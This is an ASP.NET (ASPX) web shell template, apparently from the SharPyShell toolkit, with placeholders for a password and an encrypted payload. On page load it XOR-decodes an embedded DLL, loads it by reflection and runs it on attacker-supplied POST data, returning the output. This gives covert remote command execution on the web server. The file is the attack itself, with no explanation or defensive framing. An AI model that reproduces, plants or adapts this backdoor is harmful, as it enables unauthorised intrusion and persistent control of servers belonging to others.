<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Reflection" %>

<script Language="c#" runat="server">

void Page_Load(object sender, EventArgs e)
{
	string p = "{{SharPyShell_Placeholder_pwd}}";
	string r = Request.Form["data"];
	byte[] a = {{SharPyShell_Placeholder_enc_dll}};
	for(int i = 0; i < a.Length; i++) a[i] ^= (byte)p[i % p.Length];
	Assembly aS = Assembly.Load(a);
	object o = aS.CreateInstance("SharPy");
	MethodInfo mi = o.GetType().GetMethod("Run");
	object[] iN = new object[] {r, p};
	object oU = mi.Invoke(o, iN);
	Response.Write(oU);
}

</script>
